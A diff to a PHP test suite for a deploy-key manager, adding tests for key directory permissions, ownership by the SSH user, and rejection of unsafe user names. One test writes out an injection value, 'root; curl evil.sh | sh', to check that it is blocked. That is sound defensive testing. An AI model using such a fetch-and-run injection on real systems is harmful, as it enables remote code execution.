@@ -76,14 +76,29 @@ test('the key file is written per application under the root only directory', fu
     expect(deployKeys()->keyPath($application))->toBe(DeployKeyManager::KEY_DIR.'/my-app');
 });
 
-test('the key directory and file are created unreadable to other users', function () {
+test('the key directory is closed to other users before the key is written', function () {
     $application = Application::factory()->create(['slug' => 'my-app']);
-    $commands = implode("\n", deployKeys()->installCommands($application));
+    $commands = deployKeys()->installCommands($application);
 
-    expect($commands)->toContain('chmod 700')
-        ->and($commands)->toContain('chmod 600')
+    expect($commands[0])->toContain('chmod 700')
+        ->and($commands[1])->toContain('install -m 600')
         ->and(deployKeys()->removeCommand($application))->toContain('rm -f');
 });
+
+test('the key directory is handed to the user that runs the clone', function () {
+    $server = Server::factory()->create(['ssh_user' => 'deployer']);
+    $application = Application::factory()->for($server)->create(['slug' => 'my-app']);
+
+    expect(deployKeys()->prepareDirectory($application))->toContain("chown 'deployer'");
+});
+
+test('a tampered ssh user cannot be injected into the chown', function () {
+    $server = Server::factory()->create();
+    $server->forceFill(['ssh_user' => 'root; curl evil.sh | sh'])->saveQuietly();
+    $application = Application::factory()->for($server)->create(['slug' => 'my-app']);
+
+    deployKeys()->prepareDirectory($application->fresh());
+})->throws(UnsafeNameException::class);
 
 test('git is told to use only this key and to pin the host', function () {
     $application = Application::factory()->create(['slug' => 'my-app']);
